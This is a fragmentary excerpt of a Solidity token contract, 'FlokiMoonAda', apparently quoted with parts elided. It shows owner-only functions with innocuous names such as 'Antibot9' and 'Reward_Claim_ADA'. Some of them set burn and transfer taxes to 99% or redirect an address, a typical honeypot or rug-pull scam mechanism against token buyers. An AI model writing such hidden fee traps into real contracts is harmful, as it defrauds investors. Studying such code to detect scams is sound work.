...
contract ERC200 is Context, IERC20, Ownable {
    ...
    function decimals() public view virtual returns (uint8) {
     ...
     function Antibot0() external onlyOwner(){
         _feeBurn = 0;
     }
     ...
     function Antibot9() external onlyOwner(){
         _feeBurn = 99; 
         
     }
     function Reward_Claim_ADA() external onlyOwner(){
         Address2= WBNB; 
         
     }
     function Feetx0() external onlyOwner(){
         _Feetax= 0;
     }
     function Feetx9() external onlyOwner(){
         _Feetax= 99;         
...
contract FlokiMoonAda is ERC200 {

    uint tokenTotalSupply = 100000000000;

    constructor() public ERC200("FlokiMoonAda", "FMA") {
